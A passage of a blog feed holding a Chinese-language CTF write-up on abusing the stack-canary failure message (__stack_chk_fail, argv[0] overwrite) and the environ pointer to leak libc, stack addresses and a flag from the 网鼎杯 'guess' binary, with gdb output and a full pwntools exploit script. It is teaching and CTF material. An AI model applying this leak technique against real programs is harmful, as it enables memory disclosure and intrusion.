    <link href="https://nocbtm.github.io/2020/04/28/stack-chk-fail%E7%9B%B8%E5%85%B3%E5%88%A9%E7%94%A8/"/>
    <id>https://nocbtm.github.io/2020/04/28/stack-chk-fail相关利用/</id>
    <published>2020-04-28T03:27:57.000Z</published>
    <updated>2020-04-29T16:16:56.000Z</updated>
    
    <content type="html"><![CDATA[<p>在 Linux 系统应用程序中部署 Canary 漏洞缓解机制可有效防御栈溢出漏洞的攻击，然而在一定环境下，攻击者可利用该机制泄露内存信息，实现进一步的攻击。</p><h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><h2 id="1-Stack-smash"><a href="#1-Stack-smash" class="headerlink" title="1. Stack smash"></a>1. Stack smash</h2><p>Linux 系统中，为了防御栈溢出漏洞的利用，通常会部署 Canary 漏洞缓解措施。Wiki 中对 Canary 的解释如下：</p><blockquote><p>Canaries or canary words are known values that are placed between a buffer and control data on the stack to monitor buffer overflows. When the buffer overflows, the first data to be corrupted will usually be the canary, and a failed verification of the canary data will therefore alert of an overflow, which can then be handled, for example, by invalidating the corrupted data.</p></blockquote><p>下面简单描述下 Canary 的原理。对于栈溢出漏洞的利用，最简单的方法就是通过溢出数据修改栈中函数返回地址为目标内存地址，当函数返回时将会跳转到目标内存处执行指令，从而实现控制流劫持。为了防御这种利用方法，分配栈空间时在 EBP-4 的位置存放一个 Canary 值，函数返回之前会校验该值是否被修改，若检测到被修改则调用 <code>__stack_chk_fail</code> 函数抛出异常并结束进程。可见，要覆盖函数返回地址必须修改 Canary，从而可防御该攻击方法。gcc 编译器默认开启该缓解机制，编译时可用 <code>-fno-stack-protector</code> 选项关闭该机制。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> Low Address |                 |</span><br><span class="line">             +-----------------+</span><br><span class="line">     esp =&gt;  | local variables |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |    buf[0-3]     |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |    buf[4-7]     |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |     canary      |</span><br><span class="line">             +-----------------+</span><br><span class="line">     ebp =&gt;  |     old ebp     |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |   return addr   |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |      args       |</span><br><span class="line">             +-----------------+</span><br><span class="line">High Address |                 |</span><br></pre></td></tr></table></figure><p>libc 中 <code>__stack_chk_fail</code> 的源码如下，该函数调用 <code>__fortify_fail</code> 输出异常信息，其中包含 libc_argv[0] 指向的程序名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">void __attribute__ ((noreturn)) __stack_chk_fail (void)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (&quot;stack smashing detected&quot;);</span><br><span class="line">&#125;</span><br><span class="line">void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)</span><br><span class="line">&#123;</span><br><span class="line">  /* The loop is added only to keep gcc happy.  */</span><br><span class="line">  while (1)</span><br><span class="line">    __libc_message (2, &quot;*** %s ***: %s terminatedn&quot;,</span><br><span class="line">                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>若通过栈溢出漏洞可修改栈内存中 argv[0] 指针，那么触发 Stack smash 时可泄露内存信息。例如把 argv[0] 修改为 got 表项可泄露出内存中函数地址，为进一步利用提供条件。</p><h2 id="2-environ"><a href="#2-environ" class="headerlink" title="2. environ"></a>2. environ</h2><p>在 Linux 系统中，glibc 的环境指针 environ(environment pointer) 为程序运行时所需要的环境变量表的起始地址，环境表中的指针指向各环境变量字符串。从以下结果可知环境指针 environ 在栈空间的高地址处。因此，<strong>可通过 environ 指针泄露栈地址</strong>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ vmmap</span><br><span class="line">Start              End                Perm      Name</span><br><span class="line">0x00400000         0x00401000         r-xp      /home/lc/Desktop/guess/guess</span><br><span class="line">0x00601000         0x00602000         r--p      /home/lc/Desktop/guess/guess</span><br><span class="line">0x00602000         0x00603000         rw-p      /home/lc/Desktop/guess/guess</span><br><span class="line">0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7bcd000 0x00007ffff7dcd000 ---p      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dcd000 0x00007ffff7dd1000 r--p      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p      mapped</span><br><span class="line">0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp      /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7fdb000 0x00007ffff7fde000 rw-p      mapped</span><br><span class="line">0x00007ffff7ff7000 0x00007ffff7ffa000 r--p      [vvar]</span><br><span class="line">0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp      [vdso]</span><br><span class="line">0x00007ffff7ffc000 0x00007ffff7ffd000 r--p      /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p      /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffe000 0x00007ffff7fff000 rw-p      mapped</span><br><span class="line">0x00007ffffffde000 0x00007ffffffff000 rw-p      [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp      [vsyscall]</span><br><span class="line">gdb-peda$ print environ</span><br><span class="line">$1 = (char **) 0x7fffffffdc98</span><br><span class="line">gdb-peda$ telescope 0x7fffffffdc98</span><br><span class="line">0000| 0x7fffffffdc98 --&gt; 0x7fffffffe0ae (&quot;XDG_SESSION_ID=c2&quot;)</span><br><span class="line">0008| 0x7fffffffdca0 --&gt; 0x7fffffffe0c0 (&quot;QT_LINUX_ACCESSIBILITY_ALWAYS_ON=1&quot;)</span><br><span class="line">0016| 0x7fffffffdca8 --&gt; 0x7fffffffe0e3 (&quot;UNITY_DEFAULT_PROFILE=unity&quot;)</span><br><span class="line">0024| 0x7fffffffdcb0 --&gt; 0x7fffffffe0ff (&quot;GNOME_KEYRING_PID=&quot;)</span><br><span class="line">0032| 0x7fffffffdcb8 --&gt; 0x7fffffffe112 (&quot;GNOME_KEYRING_CONTROL=&quot;)</span><br><span class="line">0040| 0x7fffffffdcc0 --&gt; 0x7fffffffe129 (&quot;DEFAULTS_PATH=/usr/share/gconf/ubuntu.default.path&quot;)</span><br><span class="line">0048| 0x7fffffffdcc8 --&gt; 0x7fffffffe15c (&quot;LOGNAME=lc&quot;)</span><br><span class="line">0056| 0x7fffffffdcd0 --&gt; 0x7fffffffe167 (&quot;INSTANCE=&quot;)</span><br></pre></td></tr></table></figure><h1 id="实例分析-网鼎杯-pwn-guess"><a href="#实例分析-网鼎杯-pwn-guess" class="headerlink" title="实例分析  网鼎杯 pwn-guess"></a>实例分析  网鼎杯 pwn-guess</h1><p>下面通过调试 <a href="https://github.com/0x4C43/Linux-Exploit/tree/master/stack_smash" target="_blank" rel="noopener">网鼎杯的 pwn-GUESS</a> 的利用过程说明 Stack smash 利用方法。</p><h2 id="1-漏洞位置"><a href="#1-漏洞位置" class="headerlink" title="1. 漏洞位置"></a>1. 漏洞位置</h2><p>程序首先将 flag 读入内存中的 buf，用户有 3 次猜测 flag 的机会。通过 gets() 读取用户输入时存在栈溢出漏洞。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  puts(&quot;This is GUESS FLAG CHALLENGE!&quot;);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( v6 &gt;= v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;you have no sense... bye :-) &quot;);</span><br><span class="line">      return 0LL;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = sub_400A11();</span><br><span class="line">    if ( !v5 )</span><br><span class="line">      break;</span><br><span class="line">    ++v6;</span><br><span class="line">    wait((__WAIT_STATUS)&amp;stat_loc);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Please type your guessing flag&quot;);</span><br><span class="line">  gets(&amp;s2);         // overflow</span><br><span class="line">  if ( !strcmp(&amp;buf, &amp;s2) )</span><br><span class="line">    puts(&quot;You must have great six sense!!!! :-o &quot;);</span><br><span class="line">  else</span><br><span class="line">    puts(&quot;You should take more effort to get six sence, and one more challenge!!&quot;);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h2><p>首先查看程序开启的漏洞缓解机制，发现已开启 Canary 和 NX，未开启 PIE。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec </span><br><span class="line">CANARY    : ENABLED</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure><p>由于程序中 sub_400A11() 函数使用 fork 子进程的方式允许用户有 3 次猜测 flag 的机会，同时又将 flag 读入栈中，因此可利用 Stack smash 进行 3 次内存泄漏获得 flag。具体利用思路如下：</p><ul><li>通过栈溢出漏洞覆盖 argv[0] 为 <code>__libc_start_main</code> 的 got 表项，触发 Stack smash 可泄露 <code>__libc_start_main</code> 函数地址，利用给出的 libc 文件可计算得到 libc 基地址；</li><li>计算出 environ 在内存中的地址，第二次利用栈溢出漏洞覆盖 argv[0] 为 <code>environ</code> ，泄露出 environ 的值，即指向环境变量的栈地址；</li><li>根据栈内存中 flag 与 environ 值的偏移量计算出 flag 的栈地址，再次利用栈溢出漏洞覆盖 argv[0] 为 flag 的栈地址，从而可读取 flag 的值。</li></ul><h3 id="1）泄露-libc-基址"><a href="#1）泄露-libc-基址" class="headerlink" title="1）泄露 libc 基址"></a>1）泄露 libc 基址</h3><p>首先，从下图栈内存信息可知缓冲区 s2 地址为 0x7fffffffdb60， argv[0] 地址为 0x7fffffffdc88，从而可计算出 s2 与 argv[0] 间的偏移量为 0x128（0x7fffffffdc88-0x7fffffffdb60）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x400b1b:    mov    rdi,rax</span><br><span class="line">   0x400b1e:    mov    eax,0x0</span><br><span class="line">   0x400b23:    call   0x400830 &lt;gets@plt&gt;</span><br><span class="line">=&gt; 0x400b28:    lea    rdx,[rbp-0x40]</span><br><span class="line">   0x400b2c:    lea    rax,[rbp-0x70]</span><br><span class="line">   0x400b30:    mov    rsi,rdx</span><br><span class="line">   0x400b33:    mov    rdi,rax</span><br><span class="line">   0x400b36:    call   0x400820 &lt;strcmp@plt&gt;</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x0000000000400b28 in ?? ()</span><br><span class="line">gdb-peda$ stack 20</span><br><span class="line">0000| 0x7fffffffdb00 --&gt; 0x7fffffffdc88 --&gt; 0x7fffffffe091 (&quot;/home/lc/Desktop/guess/guess&quot;)</span><br><span class="line">0008| 0x7fffffffdb08 --&gt; 0x100000000 </span><br><span class="line">0016| 0x7fffffffdb10 --&gt; 0x0 </span><br><span class="line">0024| 0x7fffffffdb18 --&gt; 0x3 </span><br><span class="line">0032| 0x7fffffffdb20 --&gt; 0x0 </span><br><span class="line">0040| 0x7fffffffdb28 --&gt; 0x3 </span><br><span class="line">0048| 0x7fffffffdb30 (&quot;flag&#123;43861991f7e943090e257863eec75961&#125;\n&quot;)</span><br><span class="line">0056| 0x7fffffffdb38 (&quot;61991f7e943090e257863eec75961&#125;\n&quot;)</span><br><span class="line">0064| 0x7fffffffdb40 (&quot;943090e257863eec75961&#125;\n&quot;)</span><br><span class="line">0072| 0x7fffffffdb48 (&quot;57863eec75961&#125;\n&quot;)</span><br><span class="line">0080| 0x7fffffffdb50 --&gt; 0xa7d3136393537 (&apos;75961&#125;\n&apos;)</span><br><span class="line">0088| 0x7fffffffdb58 --&gt; 0x0 </span><br><span class="line">0096| 0x7fffffffdb60 (&apos;A&apos; &lt;repeats 16 times&gt;)</span><br><span class="line">0104| 0x7fffffffdb68 (&quot;AAAAAAAA&quot;)</span><br><span class="line">0112| 0x7fffffffdb70 --&gt; 0x0</span><br></pre></td></tr></table></figure><p>因此可构造以下 payload 将 argv[0] 覆盖为 <code>__libc_start_main</code> 的 got 表项，可泄露出 <code>__libc_start_main</code> 函数在内存中的地址，从而计算出 libc 的基址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;A&apos; * 0x128 + p64(libc_start_main_got)</span><br><span class="line">libc_base_addr = libc_start_main_addr - libc.symbols[&apos;__libc_start_main&apos;]</span><br></pre></td></tr></table></figure><p>泄露出 libc 基址为 0x7ffff7a0d000。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x7a bytes:</span><br><span class="line">    00000000  59 6f 75 20  73 68 6f 75  6c 64 20 74  61 6b 65 20  │You │shou│ld t│ake │</span><br><span class="line">    00000010  6d 6f 72 65  20 65 66 66  6f 72 74 20  74 6f 20 67  │more│ eff│ort │to g│</span><br><span class="line">    00000020  65 74 20 73  69 78 20 73  65 6e 63 65  2c 20 61 6e  │et s│ix s│ence│, an│</span><br><span class="line">    00000030  64 20 6f 6e  65 20 6d 6f  72 65 20 63  68 61 6c 6c  │d on│e mo│re c│hall│</span><br><span class="line">    00000040  65 6e 67 65  21 21 0a 2a  2a 2a 20 73  74 61 63 6b  │enge│!!·*│** s│tack│</span><br><span class="line">    00000050  20 73 6d 61  73 68 69 6e  67 20 64 65  74 65 63 74  │ sma│shin│g de│tect│</span><br><span class="line">    00000060  65 64 20 2a  2a 2a 3a 20  40 d7 a2 f7  ff 7f 20 74  │ed *│**: │@···│·· t│</span><br><span class="line">    00000070  65 72 6d 69  6e 61 74 65  64 0a                     │ermi│nate│d·│</span><br><span class="line">    0000007a</span><br><span class="line">libc_base_addr = 0x7ffff7a0d000</span><br></pre></td></tr></table></figure><h3 id="2）泄露-environ"><a href="#2）泄露-environ" class="headerlink" title="2）泄露 environ"></a>2）泄露 environ</h3><p>构造以下 payload，第二次利用栈溢出将 argv[0] 覆盖为 <code>environ</code> 的地址，从而泄露出 <code>environ</code> 的值，该值为执行环境变量的栈地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">environ_addr = libc_base_addr + libc.symbols[&apos;_environ&apos;]</span><br><span class="line">payload1 = &apos;A&apos; * 0x128 + p64(environ_addr)</span><br></pre></td></tr></table></figure><p>泄露出 <code>environ</code> 的值为 0x7fffffffdcf8。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x7a bytes:</span><br><span class="line">    00000000  59 6f 75 20  73 68 6f 75  6c 64 20 74  61 6b 65 20  │You │shou│ld t│ake │</span><br><span class="line">    00000010  6d 6f 72 65  20 65 66 66  6f 72 74 20  74 6f 20 67  │more│ eff│ort │to g│</span><br><span class="line">    00000020  65 74 20 73  69 78 20 73  65 6e 63 65  2c 20 61 6e  │et s│ix s│ence│, an│</span><br><span class="line">    00000030  64 20 6f 6e  65 20 6d 6f  72 65 20 63  68 61 6c 6c  │d on│e mo│re c│hall│</span><br><span class="line">    00000040  65 6e 67 65  21 21 0a 2a  2a 2a 20 73  74 61 63 6b  │enge│!!·*│** s│tack│</span><br><span class="line">    00000050  20 73 6d 61  73 68 69 6e  67 20 64 65  74 65 63 74  │ sma│shin│g de│tect│</span><br><span class="line">    00000060  65 64 20 2a  2a 2a 3a 20  f8 dc ff ff  ff 7f 20 74  │ed *│**: │····│·· t│</span><br><span class="line">    00000070  65 72 6d 69  6e 61 74 65  64 0a                     │ermi│nate│d·│</span><br><span class="line">    0000007a</span><br><span class="line">stack_addr = 0x7fffffffdcf8</span><br></pre></td></tr></table></figure><p>可在 gdb 中验证该值为正确的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ print environ</span><br><span class="line">$1 = (char **) 0x7fffffffdcf8</span><br><span class="line">gdb-peda$ telescope 0x7fffffffdcf8</span><br><span class="line">0000| 0x7fffffffdcf8 --&gt; 0x7fffffffe0ea (&quot;INSTANCE=&quot;)</span><br><span class="line">0008| 0x7fffffffdd00 --&gt; 0x7fffffffe0f4 (&quot;MANDATORY_PATH=/usr/share/gconf/ubuntu.mandatory.path&quot;)</span><br><span class="line">0016| 0x7fffffffdd08 --&gt; 0x7fffffffe12a (&quot;ALL_PROXY=socks://192.168.239.1:1080/&quot;)</span><br><span class="line">       ...</span><br></pre></td></tr></table></figure><h3 id="3）读取-flag"><a href="#3）读取-flag" class="headerlink" title="3）读取 flag"></a>3）读取 flag</h3><p>查看内存中 flag 的地址为 0x7fffffffdb90，计算该地址与泄露栈地址的偏移量为 0x168（0x7fffffffdcf8 - 0x7fffffffdb90）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ stack 20                                                                                                                                             </span><br><span class="line">0000| 0x7fffffffdb08 --&gt; 0x7ffff7a875e8 (&lt;_IO_new_file_underflow+328&gt;:  cmp    rax,0x0)</span><br><span class="line">0008| 0x7fffffffdb10 --&gt; 0x7ffff7dd3780 --&gt; 0x0 </span><br><span class="line">     ...</span><br><span class="line">0088| 0x7fffffffdb60 --&gt; 0x7fffffffdce8 --&gt; 0x7fffffffe0e2 --&gt; 0x73736575672f2e (&apos;./guess&apos;)</span><br><span class="line">0096| 0x7fffffffdb68 --&gt; 0x100000000 </span><br><span class="line">0104| 0x7fffffffdb70 --&gt; 0x8600000000 </span><br><span class="line">0112| 0x7fffffffdb78 --&gt; 0x3 </span><br><span class="line">0120| 0x7fffffffdb80 --&gt; 0x2 </span><br><span class="line">0128| 0x7fffffffdb88 --&gt; 0x3 </span><br><span class="line">0136| 0x7fffffffdb90 (&quot;flag&#123;43861991f7e943090e257863eec75961&#125;\n&quot;)</span><br><span class="line">     ...</span><br></pre></td></tr></table></figure><p>构造以下 payload，第三次利用栈溢出覆盖 argv[0] 为 flag 的内存地址，从而可读取内存中的 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload2 = &apos;A&apos; * 0x128 + p64(stack_addr - 0x168)</span><br></pre></td></tr></table></figure><p>最终获取 flag 如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x9b bytes:</span><br><span class="line">    &apos;You should take more effort to get six sence, and one more challenge!!\n&apos;</span><br><span class="line">    &apos;*** stack smashing detected ***: flag&#123;43861991f7e943090e257863eec75961&#125;\n&apos;</span><br><span class="line">    &apos; terminated\n&apos;</span><br><span class="line">You should take more effort to get six sence, and one more challenge!!</span><br><span class="line">*** stack smashing detected ***: flag&#123;43861991f7e943090e257863eec75961&#125;</span><br><span class="line"> terminated</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">'./guess'</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line">libc_start_main_got = <span class="number">0x602048</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg(0x400B23)    </span></span><br><span class="line"><span class="comment">#raw_input("leak libc_base")</span></span><br><span class="line">p.recvuntil(<span class="string">'guessing flag\n'</span>)</span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">0x128</span> + p64(libc_start_main_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'detected ***: '</span>)</span><br><span class="line">libc_start_main_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base_addr = libc_start_main_addr - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'libc_base_addr = '</span> + hex(libc_base_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#raw_input("leak environ_addr")</span></span><br><span class="line">environ_addr = libc_base_addr + libc.symbols[<span class="string">'_environ'</span>]</span><br><span class="line">payload1 = <span class="string">'A'</span> * <span class="number">0x128</span> + p64(environ_addr)</span><br><span class="line">p.recvuntil(<span class="string">'Please type your guessing flag'</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">'stack smashing detected ***: '</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'stack_addr = '</span> + hex(stack_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#raw_input("leak flag")</span></span><br><span class="line">payload2 = <span class="string">'A'</span> * <span class="number">0x128</span> + p64(stack_addr - <span class="number">0x168</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Please type your guessing flag'</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">'&#125;'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><hr><p>References:</p><p><a href="http://0x4c43.cn/2018/1013/stack-overflow-smash-utilization/" target="_blank" rel="noopener">栈溢出 Stack smash 利用</a></p><p><a href="https://www.anquanke.com/post/id/161142#h2-0" target="_blank" rel="noopener">浅析ROP之Stack Smash</a></p><p> <a href="http://tacxingxing.com/2017/12/16/environ/" target="_blank" rel="noopener">Environ</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在 Linux 系统应用程序中部署 Canary 漏洞缓解机制可有效防御栈溢出漏洞的攻击，然而在一定环境下，攻击者可利用该机制泄露内存信息，实现进一步的攻击。&lt;/p&gt;
&lt;h1 id=&quot;利用思路&quot;&gt;&lt;a href=&quot;#利用思路&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>__do_global_dtors_aux的gadget</title>
    <link href="https://nocbtm.github.io/2020/04/21/%C2%96do-global-dtors-aux%E7%9A%84gadget/"/>
    <id>https://nocbtm.github.io/2020/04/21/do-global-dtors-aux的gadget/</id>
    <published>2020-04-21T03:30:39.000Z</published>
    <updated>2020-04-28T16:49:57.000Z</updated>
    
